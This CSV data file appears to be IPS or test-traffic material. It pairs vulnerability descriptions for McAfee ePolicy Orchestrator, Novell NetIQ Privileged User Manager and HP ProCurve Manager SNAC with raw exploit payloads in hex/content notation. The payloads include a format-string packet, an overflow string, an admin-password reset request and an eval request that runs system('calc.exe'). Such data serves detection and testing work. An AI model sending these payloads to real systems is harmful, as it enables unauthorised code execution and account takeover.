XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20080312-15_McAfee_ePolicy_Orchestrator_Framework_Services_Log_Handling_Format_String_Vulnerability.xml,McAfee ePolicy Orchestrator Framework Services Log Handling Format String Vulnerability,"There exists a Format String vulnerability in McAfee Framework Services used in McAfee ePolicy Orchestrator and other products. The vulnerability is specifically in creating new log entries without filtering format specifiers from the strings. A remote attacker can exploit this vulnerability by sending a specially crafted UDP packet to the target host. A successful exploitation of this vulnerability can allow for code execution with the privileges of the affected service, or cause a denial of service condition. In an attack case where code injection is not successful, the affected service will terminate abnormally. In a more sophisticated attack where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected service, normally System.",Proprietary Protocol,UDP,Type=||22 ||AgentWakeup||22 ||DataSize=||22 ||280||22 FA E5 A8 AB AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA D9 CF C4 CE CF D8 8F C4 8F C4 8F C4 8F D9 8F D9 8F D9 8F D9 8F C4 8F C4 8F C4 8F C4 8F C4 8F C4 8F C4 8F C4 8F D9 8F D9 8F D9 8F D9 8F D9 8F D9 8F D9 8F D9 AA AA AA AA AA AA AA AA AA AA AA AA DA CB C9 C1 CB CD CF 8F C4 8F C4 8F C4 8F D9 8F D9 8F D9 AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA C9 C5 C7 DA DF DE CF D8 8F C4 8F C4 8F C4 8F D9 8F D9 8F D9 AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB||
FSC20080312-15_McAfee_ePolicy_Orchestrator_Framework_Services_Log_Handling_Format_String_Vulnerability.xml,McAfee ePolicy Orchestrator Framework Services Log Handling Format String Vulnerability,"There exists a Format String vulnerability in McAfee Framework Services used in McAfee ePolicy Orchestrator and other products. The vulnerability is specifically in creating new log entries without filtering format specifiers from the strings. A remote attacker can exploit this vulnerability by sending a specially crafted UDP packet to the target host. A successful exploitation of this vulnerability can allow for code execution with the privileges of the affected service, or cause a denial of service condition. In an attack case where code injection is not successful, the affected service will terminate abnormally. In a more sophisticated attack where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected service, normally System.",Proprietary Protocol,UDP,Type=||22 ||AgentWakeup||22 ||DataSize=||22 ||280||22 FA E5 A8 AB AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA D9 CF C4 CE CF D8 8F C4 8F C4 8F C4 8F D9 8F D9 8F D9 8F D9 8F C4 8F C4 8F C4 8F C4 8F C4 8F C4 8F C4 8F C4 8F D9 8F D9 8F D9 8F D9 8F D9 8F D9 8F D9 8F D9 AA AA AA AA AA AA AA AA AA AA AA AA DA CB C9 C1 CB CD CF 8F C4 8F C4 8F C4 8F D9 8F D9 8F D9 AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA C9 C5 C7 DA DF DE CF D8 8F C4 8F C4 8F C4 8F D9 8F D9 8F D9 AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB EB||
﻿FSC20080402-05_McAfee_ePolicy_Orchestrator_Framework_Services_HTTP_Buffer_Overflow.xml,McAfee ePolicy Orchestrator Framework Services HTTP Buffer Overflow,"A buffer overflow vulnerability exists in McAfee Framework Services used in McAfee ePolicy Orchestrator and other products. Specifically, the vulnerability is due to a boundary error when handling of HTTP requests passed to the port 8081/TCP of the product. An unauthenticated remote attacker can exploit this vulnerability by sending a specially crafted request to the target host. A successful exploitation of this vulnerability can allow for code execution with the privileges of the affected service, or cause a denial of service condition. In an attack case where code injection is not successful, the affected service will terminate abnormally. In a more sophisticated attack where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected service, normally System.",HTTP,TCP,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||0D 0A 0D 0A||
﻿TSL20121115-02_Novell_NetIQ_Privileged_User_Manager_modifyAccounts_Policy_Bypass.xml,Novell NetIQ Privileged User Manager modifyAccounts Policy Bypass,"A policy bypass vulnerability exists in Novell NetIQ Privileged User Manager. The vulnerability is due to an access control weakness when handling a modifyAccounts request.            A remote, unauthenticated attacker can exploit this vulnerability by sending a malicious request to a vulnerable server. Successful exploitation could result in code execution under the context of SYSTEM.","HTTP,HTTPS",TCP,POST / HTTP/1.1||0D 0A ||Host||3A || 172.16.8.78||0D 0A ||Accept-Encoding||3A || identity||0D 0A ||Content-Length||3A || 159||0D 0A ||Content-Type||3A || application/x-amf||0D 0A 0D 0A 00 00 00 00 00 01 00 13 ||SPF.Util.callMaster||00 04 ||/444||00 00 02 98 0A 00 00 00 01 03 00 06 ||method||02 00 0E ||modifyAccounts||00 06 ||module||02 00 04 ||auth||00 04 ||User||03 00 04 ||name||02 00 05 ||admin||00 0A ||ACT_PASSWD||03 00 05 ||value||02 00 03 ||vrt||00 06 ||action||02 00 03 ||set||00 00 09 00 00 09 00 03 ||uid||06 00 00 09||
TSL20121115-02_Novell_NetIQ_Privileged_User_Manager_modifyAccounts_Policy_Bypass.xml,Novell NetIQ Privileged User Manager modifyAccounts Policy Bypass,"A policy bypass vulnerability exists in Novell NetIQ Privileged User Manager. The vulnerability is due to an access control weakness when handling a modifyAccounts request.            A remote, unauthenticated attacker can exploit this vulnerability by sending a malicious request to a vulnerable server. Successful exploitation could result in code execution under the context of SYSTEM.","HTTP,HTTPS",TCP,HTTP/1.0 200 OK||0D 0A ||Content-Type||3A || application/x-amf||0D 0A 0D 0A 00 00 00 00 00 01 00 0D ||/444/onResult||00 04 ||null||FF FF FF FF 03 00 03 ||vrm||02 00 05 ||2.3.1||00 03 ||svc||02 00 0C ||win2003ent32||00 00 09||
﻿TSL20121115-03_Novell_NetIQ_Privileged_User_Manager_Eval_Policy_Bypass.xml,Novell NetIQ Privileged User Manager Eval Policy Bypass,"A policy-bypass vulnerability has been reported in Novell NetIQ Privileged User Manager, which could allow remote
attackers to compromise a system. The vulnerability is due to an access control weakness when handling calls
to the eval method within POST requests.
A remote, unauthenticated attacker can exploit this vulnerability by sending a malicious eval request to the
vulnerable server. Successful exploitation could result in command execution under the context of the SYSTEM","HTTP,HTTPS",TCP,POST / HTTP/1.1||0D 0A ||Host||3A || dhcp78||0D 0A ||Accept-Encoding||3A || identity||0D 0A ||Content-Length||3A || 131||0D 0A ||Content-Type||3A || application/x-amf||0D 0A 0D 0A 00 00 00 00 00 01 00 14 ||SPF.Util.callModuleA||00 04 ||/444||00 00 02 98 0A 00 00 00 01 03 00 03 ||pkt||03 00 06 ||method||02 00 04 ||eval||00 06 ||module||02 00 08 ||ldapagnt||00 04 ||Eval||03 00 07 ||content||02 00 13 ||system(||22 ||calc.exe||22 ||)||3B 00 00 09 00 00 09 00 00 09||
TSL20121115-03_Novell_NetIQ_Privileged_User_Manager_Eval_Policy_Bypass.xml,Novell NetIQ Privileged User Manager Eval Policy Bypass,"A policy-bypass vulnerability has been reported in Novell NetIQ Privileged User Manager, which could allow remote
attackers to compromise a system. The vulnerability is due to an access control weakness when handling calls
to the eval method within POST requests.
A remote, unauthenticated attacker can exploit this vulnerability by sending a malicious eval request to the
vulnerable server. Successful exploitation could result in command execution under the context of the SYSTEM","HTTP,HTTPS",TCP,HTTP/1.0 200 OK||0D 0A ||Content-Type||3A || application/x-amf||0D 0A 0D 0A 00 00 00 00 00 01 00 0D ||/444/onResult||00 04 ||null||FF FF FF FF 03 00 08 ||AsyncReq||03 00 02 ||id||02 00 08 ||lht65sav||00 00 09 00 03 ||vrm||02 00 05 ||2.3.1||00 03 ||svc||02 00 0C ||win2003ent32||00 00 09||
﻿TSL20130912-09_HP_ProCurve_Manager_SNAC_GetDomainControllerServlet_Policy_Bypass.xml,HP ProCurve Manager SNAC GetDomainControllerServlet Policy Bypass,A policy bypass vulnerability exists in HP ProCurve Manager SNAC. The vulnerability is due to a design weakness in the GetDomainControllerServlet class. A remote attacker could exploit the vulnerability by sending specially crafted data to a vulnerable version of the software. Successful exploitation could result in authentication bypass.,HTTPS,TCP,GET /RegWeb/html/snac/index.html HTTP/1.1||0D 0A ||Host||3A || dhcp29||0D 0A ||Accept-Encoding||3A || identity||0D 0A 0D 0A||
TSL20130912-09_HP_ProCurve_Manager_SNAC_GetDomainControllerServlet_Policy_Bypass.xml,HP ProCurve Manager SNAC GetDomainControllerServlet Policy Bypass,A policy bypass vulnerability exists in HP ProCurve Manager SNAC. The vulnerability is due to a design weakness in the GetDomainControllerServlet class. A remote attacker could exploit the vulnerability by sending specially crafted data to a vulnerable version of the software. Successful exploitation could result in authentication bypass.,HTTPS,TCP,GET /RegWeb/RegWeb/GetDomainControllerServlet HTTP/1.1||0D 0A ||Host||3A || dhcp29||0D 0A ||Accept-Encoding||3A || identity||0D 0A ||Cookie||3A || JSESSIONID=9730FF3900BEC10735B1345FDFFA9579||3B 0D 0A 0D 0A||
TSL20130912-09_HP_ProCurve_Manager_SNAC_GetDomainControllerServlet_Policy_Bypass.xml,HP ProCurve Manager SNAC GetDomainControllerServlet Policy Bypass,A policy bypass vulnerability exists in HP ProCurve Manager SNAC. The vulnerability is due to a design weakness in the GetDomainControllerServlet class. A remote attacker could exploit the vulnerability by sending specially crafted data to a vulnerable version of the software. Successful exploitation could result in authentication bypass.,HTTPS,TCP,"HTTP/1.1 200 OK||0D 0A ||Server||3A || Apache-Coyote/1.1||0D 0A ||Pragma||3A || No-cache||0D 0A ||Cache-Control||3A || no-cache||0D 0A ||Expires||3A || Wed, 31 Dec 1969 16||3A ||00||3A ||00 PST||0D 0A ||Set-Cookie||3A || JSESSIONID=9730FF3900BEC10735B1345FDFFA9579||3B || Path=/RegWeb||0D 0A ||ETag||3A || W/||22 ||6044-1328307300000||22 0D 0A ||Last-Modified||3A || Fri, 03 Feb 2012 22||3A ||15||3A ||00 GMT||0D 0A ||Content-Type||3A || text/html||0D 0A ||Content-Length||3A || 6044||0D 0A ||Date||3A || Fri, 27 Sep 2013 16||3A ||10||3A ||55 GMT||0D 0A 0D 0A ||<!DOCTYPE html>||0D 0A ||<!--||0D 0A ||    Module||3A || login.html||0D 0A ||    Copyright (c) 2011, Hewlett-Packard Company.||0D 0A ||    All Rights Reserved.||0D 0A ||    The contents of this software are proprietary and confidential to the||0D 0A ||    Hewlett-Packard Company. No part of this program may be photocopied,||0D 0A ||    reproduced, or translated into another programming language without||0D 0A ||    prior written consent of the Hewlett-Packard Company.||0D 0A ||-->||0D 0A ||<html>||0D 0A ||    <head>||0D 0A ||        <title>HP Login</title>||0D 0A ||        <style type=||22 ||text/css||22 ||>||0D 0A ||            body {||0D 0A ||                margin||3A || 0px||3B 0D 0A ||                font-family||3A || verdana||3B 0D 0A ||                font-size||3A || 10pt||3B 0D 0A ||                vertical-align||3A || top||3B 0D 0A ||                color||3A || black||3B 0D 0A ||                background||3A || white||3B 0D 0A ||            }||0D 0A ||            .login-form {||0D 0A ||                margin||3A || 10% 35% 0% 35%||3B 0D 0A ||                padding-top||3A || 20px||3B 0D 0A ||                text-align||3A || center||3B 0D 0A ||            }||0D 0A ||            .header {||0D 0A ||                color||3A || white||3B 0D 0A ||                height||3A || 81px||3B 0D 0A ||                padding||3A || 10px 10px 10px 10px||3B 0D 0A ||                background||3A || #000 url(||22 ||/RegWeb/images/blackbg.png||22 ||) repeat||3B 0D 0A ||            }||0D 0A ||            .header h2 {||0D 0A ||                color||3A || white||3B 0D 0A ||                font-size||3A || 25px||3B 0D 0A ||            }||0D 0A ||            .footer {||0D 0A ||                color||3A || black||3B 0D 0A ||                height||3A || 15px||3B 0D 0A ||                margin||3A || 1% 40% 0% 31%||3B 0D 0A ||                text-align||3A || center||3B 0D 0A ||            }||0D 0A ||            h1 {||0D 0A ||                font-size||3A || 30px||3B 0D 0A ||            }||0D 0A ||            h2 {||0D 0A ||                font-size||3A || 20px||3B 0D 0A ||            }||0D 0A 0D 0A ||        </style>||0D 0A ||        <link rel=||22 ||stylesheet||22 || type=||22 ||text/css||22 || href= ||22 ||/RegWeb/lib/ext/resources/css/ext-all.css||22 ||>||0D 0A ||        <link rel=||22 ||stylesheet||22 || type=||22 ||text/css||22 || href= ||22 ||/RegWeb/lib/ext/resources/css/xtheme-gray.css||22 ||>||0D 0A ||        <script type=||22 ||text/javascript||22 || src= ||22 ||/RegWeb/lib/ext/adapter/ext/ext-base.js||22 ||>||0D 0A ||        </script>||0D 0A 09 09 ||<script type=||22 ||text/javascript||22 || src= ||22 ||/RegWeb/lib/js/header.js||22 ||>||0D 0A ||        </script>||0D 0A ||        <script type=||22 ||text/javascript||22 || src=||22 ||/RegWeb/lib/ext/ext-all-debug.js||22 ||>||0D 0A ||        </script>||0D 0A ||        <script>||0D 0A ||            Ext.onReady( function() {||0D 0A 09 09 09 ||    setupHeader()||3B 0D 0A ||                var login_form = new Ext.FormPanel({||0D 0A ||                    renderTo||3A || 'loginform',||0D 0A ||                    frame||3A || true,||0D 0A ||                    padding||3A || '15px',||0D 0A ||                    title||3A || 'HP SNAC Registration Server Login',||0D 0A ||                    width||3A || 350,||0D 0A ||                    height||3A ||150,||0D 0A ||                    monitorValid||3A || true,||0D 0A ||                    items||3A || [{||0D 0A ||                        xtype||3A || 'textfield',||0D 0A ||                        //style||3A || 'textTransform||3A ||lowercase',||0D 0A ||                        fieldLabel||3A || '<b>Username</b>',||0D 0A ||                        name||3A || 'j_username_1',||0D 0A ||                        id||3A ||'j_username_1',||0D 0A ||                        anchor||3A ||'95%'||0D 0A ||                    },{||0D 0A ||                        xtype||3A || 'textfield',||0D 0A ||                        fieldLabel||3A || '<b>Password</b>',||0D 0A ||                        inputType||3A ||'password',||0D 0A ||                        name||3A || 'j_password',||0D 0A ||                        anchor||3A ||'95%'||0D 0A ||                    }, {||0D 0A ||                    ||09 ||xtype||3A || 'hidden',||0D 0A ||                    ||09 ||fieldLabel||3A || '',||0D 0A ||                    ||09 ||name||3A ||'j_username',||0D 0A ||                    ||09 ||id||3A ||'j_username',||0D 0A ||                    ||09 ||hidden||3A ||'true'||0D 0A ||                    }],||0D 0A ||                    onSubmit||3A || Ext.emptyFn,||0D 0A ||                    submit||3A || function() {||0D 0A ||                        login_form.getForm().getEl().dom.action='j_security_check'||3B 0D 0A ||                        login_form.getForm().getEl().dom.submit()||3B 0D 0A ||                    },||0D 0A ||                    keys ||3A || [{||0D 0A 09 09 09 09 09 09 09 09 09 ||key ||3A || [13],||0D 0A 09 09 09 09 09 09 09 09 09 ||fn ||3A || function() {||0D 0A 09 09 09 09 09 09 09 09 09 || Ext.getCmp('submitBtn').focus()||3B 0D 0A 09 09 09 09 09 09 09 09 09 || Ext.getCmp('submitBtn').fireEvent(||22 ||click||22 ||,||0D 0A 09 09 09 09 09 ||                            Ext.getCmp('submitBtn'))||3B 0D 0A 09 09 09 09 09 09 09 09 09 ||}||0D 0A 09 09 09 09 09 09 09 09 ||}||0D 0A 0D 0A 09 09 09 09 09 ||],||0D 0A ||                    buttons||3A || [{text||3A || 'Login',||0D 0A ||                        type||3A || 'submit',||0D 0A ||                        id||3A ||'submitBtn',||0D 0A ||                        tooltip||3A || 'Login',||0D 0A ||                        clickEvent||3A || 'click',||0D 0A ||                        formBind||3A ||true,||0D 0A ||                        handler||3A || function() {||0D 0A ||                            var fmURL = 'j_security_check'||3B || //The url that will process the form||0D 0A ||                            login_form.getForm().submit({||0D 0A ||                                url||3A ||fmURL,||0D 0A ||                                method||3A ||'POST',||0D 0A ||                                waitMsg||3A ||'login in progress..',||0D 0A ||                                waitTitle||3A ||'Login',||0D 0A ||                                success||3A || function (theform, theAction) {||0D 0A ||                                    // This function is never called apparently||0D 0A ||                                    alert(||22 ||success||22 ||)||3B 0D 0A ||                                },||0D 0A ||                                failure||3A || function (theform, theAction) {||0D 0A ||                                    // This function is never called apparently||0D 0A ||                                    alert(||22 ||failure||22 ||)||3B 0D 0A ||                                }||0D 0A ||                            })||3B 0D 0A ||                        }||0D 0A ||                    }]||0D 0A ||                })||3B 0D 0A ||                Ext.get('j_username_1').on('change', function() {||0D 0A ||                ||09 ||Ext.getCmp('j_username').setValue(Ext.getCmp('j_username_1').getValue().toLowerCase())||3B 0D 0A ||                })||3B 0D 0A ||            })||3B 0D 0A ||        </script>||0D 0A ||    </head>||0D 0A ||    <body>||0D 0A ||        <div class=||22 ||header||22 ||>||0D 0A ||            <table id=||22 ||header-table||22 ||>||0D 0A ||                <tr>||0D 0A ||                    <td style=||22 ||padding-right||3A ||10px||22 ||>||0D 0A ||                    <img alt=||22 ||HP Networking||22 || src=||22 ||/RegWeb/images/hp.png||22 ||/>||0D 0A ||                    </td>||0D 0A ||                    <td>||0D 0A ||                    <div id=||22 ||heading-text||22 ||><h2>Networking</h2></div>||0D 0A ||                    </td>||0D 0A ||                </tr>||0D 0A ||            </table>||0D 0A ||        </div>||0D 0A ||        <div id=||22 ||formbody||22 ||>||0D 0A ||            <div id=||22 ||loginform||22 || class=||22 ||login-form||22 ||>||0D 0A ||            </div>||0D 0A ||            <div class=||22 ||footer||22 ||>||0D 0A ||                &copy 2011 Hewlett-Packard Development Company, L.P.||0D 0A ||            </div>||0D 0A ||        </div>||0D 0A ||    </body>||0D 0A ||</html>||0D 0A||"
